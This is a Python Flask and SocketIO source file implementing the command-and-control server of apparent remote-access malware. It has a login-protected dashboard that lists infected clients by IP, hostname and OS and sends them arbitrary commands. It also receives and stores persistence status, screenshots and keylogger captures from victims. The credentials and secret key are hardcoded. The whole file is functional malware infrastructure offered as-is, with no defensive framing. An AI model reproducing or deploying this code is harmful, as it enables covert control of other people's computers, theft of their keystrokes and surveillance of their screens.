from flask import *
from flask_socketio import SocketIO, send

app = Flask(__name__)
socketio = SocketIO(app)
app.secret_key = 'MY TOP SECRET KEY'

user1 = 'Admin'
pass1 = 'toor'
idNum = 0
database = []
completedTasks = []
screenshotNumber = 0
keyloggerNumber = 0

class taskDone:
    def __init__(self, info):
        self.idNum = info['idNum']
        self.hostname = info['hostname']
        self.commandSent = info['commandSent']
        self.output = info['DATA']

class client:
    def __init__(self, info):
        global idNum
        self.idNum = idNum
        idNum = idNum + 1
        self.persistence = False
        self.IP = info['IP']
        self.hostname = info['hostname']
        self.OS = info['OS']
        self.sid = info['sid']



@app.route('/')
def redirectLogin():
    return redirect(url_for('login'))


@app.route('/login.html', methods=['post', 'get'])
def login():
    if request.method == 'POST':
        username = request.form.get('userid')
        password = request.form.get('passid')
        if username == user1 and password == pass1:
            session['loggedin'] = True
            session['username'] = user1
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html')
    return render_template('login.html')


@app.route('/dashboard.html')
def dashboard():
    try:
        if session['loggedin'] == True:
            return render_template('dashboard.html', database=database)
    except:
        return redirect('login.html')


@app.route('/sendcommands.html', methods=['get', 'post'])
def sendcommands():
    try:
        if session['loggedin']:

            if request.method == 'POST':
                idNumber = request.form.get('idNumber')
                command = request.form.get('command')
                for x in database:
                    if str(x.idNum) == str(idNumber):
                        commmunication = {}
                        commmunication['newTask'] = command
                        commmunication['idNum'] = x.idNum
                        send(commmunication, room=x.sid, namespace='')

                return render_template('sendcommands.html', commandStatus='Command Sent')
            else:
                return render_template('sendcommands.html')

    except Exception as e:
        print (str(e))
        return redirect('login.html')


@app.route('/recievedcommands.html')
def recievedcommands():
    try:
        if session['loggedin']:
            return render_template('recievedcommands.html', taskDb=completedTasks)

    except Exception as e:
        print(str(e))
        return redirect('login.html')


@app.route('/logout.html')
def logout():
    session.pop('loggedin', None)
    session.pop('username', None)
    return redirect(url_for('login'))


@socketio.on('connect')
def onConnect():
    pass


@socketio.on('message')
def handleMessage(message):
    if message['COMMAND'] == 'INFO':
        database.append(client(message))

    elif message['COMMAND'] == 'OUTPUT':

        if 'persistence' in message['commandSent']:
            if message['PV']:
                for x in database:
                    if x.idNum == message['idNum']:
                        x.persistence = True

        if "screenshot" in message['commandSent']:
            global screenshotNumber
            with open('./static/receivedData/screenshots/' + str(screenshotNumber) + '.png', 'wb') as f:
                f.write(message['DATA'])
                f.close()
                tmp = './static/receivedData/screenshots/' + str(screenshotNumber) + '.png'
                message['DATA'] = tmp
                screenshotNumber = screenshotNumber + 1

        if 'keylogger' in message['commandSent']:
            global keyloggerNumber
            with open('./static/receivedData/keylogs/' + str(keyloggerNumber) + '.txt', 'wb') as f:
                print(message['DATA'])
                f.write(message['DATA'])
                f.close()
                tmp = './static/receivedData/keylogs/' + str(keyloggerNumber) + '.txt'
                message['DATA'] = tmp
                keyloggerNumber = keyloggerNumber + 1



        print(message['DATA'])
        completedTasks.append(taskDone(message))

if __name__ == '__main__':
    socketio.run(app.run())
